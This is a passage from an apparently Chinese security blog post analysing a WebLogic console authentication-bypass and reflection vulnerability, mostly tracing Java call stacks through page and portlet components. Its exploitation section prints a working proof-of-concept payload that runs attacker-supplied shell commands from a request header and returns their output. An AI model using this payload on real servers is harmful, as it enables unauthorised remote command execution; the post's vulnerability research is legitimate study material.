![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFIrkpKaac4M4QDQtphqtKxyqG3yAa6UbNC4icLMGkfZRDicyyqQx4Id5w/640?wx_fmt=jpeg)

一路向下跟进，调用栈如下：

```
org.apache.struts.action.ActionServlet#process ->
com.bea.console.internal.ConsoleActionServlet#process ->
org.apache.beehive.netui.pageflow.PageFlowActionServlet#process ->
org.apache.beehive.netui.pageflow.AutoRegisterActionServlet#process ->
org.apache.beehive.netui.pageflow.PageFlowRequestProcessor#process ->
org.apache.beehive.netui.pageflow.PageFlowRequestProcessor#processInternal ->
org.apache.struts.action.RequestProcessor#process ->
com.bea.console.internal.ConsolePageFlowRequestProcessor#processActionPerform ->
com.bea.console.utils.HandleUtils#getHandleContextFromRequest ->
com.bea.console.utils.HandleUtils#handleFromQueryString
```

重点看一下`com.bea.console.utils.HandleUtils#handleFromQueryString`：  

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFUTgQlj9GCLZY9ZX0KxGLgJMQIWhT0GnrEQjMFAiaaxJwIdYTKIvtDlw/640?wx_fmt=jpeg)

首先会将请求的参数进行解析，并映射到 Map 中，之后遍历所有的参数，当参数以`handle`结尾，则将其转换为`Handle`类型的对象。所以跟踪流程到`com.bea.console.handles.HandleConverter#convert`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFicP0vf2CbpXhRjRVdoyBPhhzTbTyS4l6azI90mNzwJl5Onyr2T58YbQ/640?wx_fmt=jpeg)

这里会将请求中以`handle`结尾的参数值作为`local`，直接传入`HandleFactory.getHandle()`方法中，在该方法中将传入的参数值进行处理，直接完成反射实例化操作：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF32SiaPEQBWnRmQQLliaQMRiaUlNyaGenPqz8zZ7O9NTxk9DO5vhrjXYtw/640?wx_fmt=jpeg)

### 2.3.2 page

当解析`Page`组件时，`control.preRender()`实际将会调用`com.bea.netuix.servlets.controls.page.Page#preRender`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF7JW80BAWonztSR7dLSewZJN9xOSmhYz5MEPOHSRJJFw8fgcAiaIgNeQ/640?wx_fmt=jpeg)

接下来就是一路向上，调用父类的`preRender`方法，调用栈如下：

```
com.bea.netuix.servlets.controls.page.Page#preRender ->
com.bea.netuix.servlets.controls.window.Window#preRender ->
com.bea.netuix.servlets.controls.AdministeredBackableControl#preRender ->
com.bea.netuix.servlets.controls.Backable.Impl#preRender
```

在`com.bea.netuix.servlets.controls.Backable.Impl#preRender`中将会获取`jspbacking`，并调用其`preRender`方法：  

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFhQuxGpKPYPia6QqZ1oRnF4Bm3jZPsqBzU6LISMqYBPGmcQATVJLRTTw/640?wx_fmt=jpeg)

以`consolejndi.portal`为例，其中的一个`page`组件描述如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFqYEO3gxPwQ4hpiawnRoiaVYjU4rgiadAKyP5qewmmI7icR3rOhjSzovviaw/640?wx_fmt=jpeg)

此处会根据`book`组件中所定义的`title`获取其`backingFile`的具体引用，在这里为`com.bea.console.utils.JndiViewerBackingFile`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFbT0uUib213IonoN92DY1xic6evqYf4kWGcqOSLNCqeGue8C1ibD8K0VJA/640?wx_fmt=jpeg)

接下来的调用栈为：

```
com.bea.console.utils.GeneralBackingFile#preRender ->
com.bea.console.utils.GeneralBackingFile#localizeTitle(com.bea.netuix.servlets.controls.window.backing.WindowBackingContext, javax.servlet.http.HttpServletRequest) ->
com.bea.console.utils.GeneralBackingFile#getDisplayName ->
com.bea.console.utils.HandleUtils#getHandleContextFromRequest
```

调用至此已经和 2.3.1 中提到的调用路径相同了，在此不再赘述。  

### 2.3.3 portlet

`portlet`组件执行流与`page`组件基本完全相同，唯一区别点在于`backingFile`不同。以`consolejndi.portal`为例：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFdO52NiaHCyGnTzGbtH3BicaWiaJdAP7gJSibfxf0XLrMl5TVXbXxibqvSbA/640?wx_fmt=jpeg)

引用外部组件，跟进`jnditree.portlet`：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFuL6oZGDYM5BX0TibpCf8BENeLwBwx5D8G1qiaRUj8UpljKnL7RFMFOgw/640?wx_fmt=jpeg)

跟进看一下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFXibhiavhUWdla6M3HfzwCwNicZnicanbyCw5hnfZ0oQEpUvgoCCu7J4ntw/640?wx_fmt=jpeg)

调用父类`com.bea.console.utils.PortletBackingFile#preRender`，同样，都会调用父类的`localizeTitle()`方法：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFQ5Tq46ba3B9jtSWbFQhaz5JZB1nJcp0WHKObbPpWuULYw08ic3ujxow/640?wx_fmt=jpeg)

这里也会调用`com.bea.console.utils.GeneralBackingFile#localizeTitle`，之后的流程与 2.3.2 中的流程完全相同。

### 2.3.4 总结

根据以上分析，我们可以看到除了`strutsContent`外，其他几种组件的应用方式都比较类似，关键点为两个：

*   组件的`preRender`流程中会调用到`Backable#preRender`方法
    
*   `backingFile`为`GeneralBackingFile`子类，同时其`preRender`方法会调用父类`localizeTitle`方法
    

想要寻找其他的组件可以看一下继承树：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGF0fPe3bwK4bxaakP0NjhYdZx5XUaJiasUPAxPhEmlubjfJWLJl7cwjBQ/640?wx_fmt=jpeg)

红框所标注的即为 2.3.2 与 2.3.3 中所分析到的调用过程。

**0x03 漏洞利用**
=============

经过 0x02 的分析，我们不难看出该漏洞和其他传统的越权漏洞是有很大区别的：

1.  所谓的认证绕过是通过请求原本无需认证的资源路径
    
2.  在 1 的基础上利用`../`造成目录穿越，使`Netuix`在初始化语法树时读取对应的后台模板文件
    
3.  在`Netuix`生命周期中通过组件对应的处理流程触发`Handle`流程
    
4.  组件处理流程中会将请求中以`handle`结尾的参数的值作为参数传入`HandleFactory#getHandle`方法中，完成反射调用
    

所以利用方式也显而易见，这里利用 @77ca1k1k1 的 poc 做展示：

![](https://mmbiz.qpic.cn/mmbiz_jpg/La0UYqKZf7dGoM7hCTN6zUib5q8L6EEGFib2FwIacBfzkVNWdnfKqXVNUHTh6haicJsbBLiaQ7yRnFJkC61Znszvqw/640?wx_fmt=jpeg)

poc：

```
com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
```

**0x04 Reference**  

=====================

```
https://docs.oracle.com/cd/E13218_01/wlp/docs81/whitepapers/netix/body.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**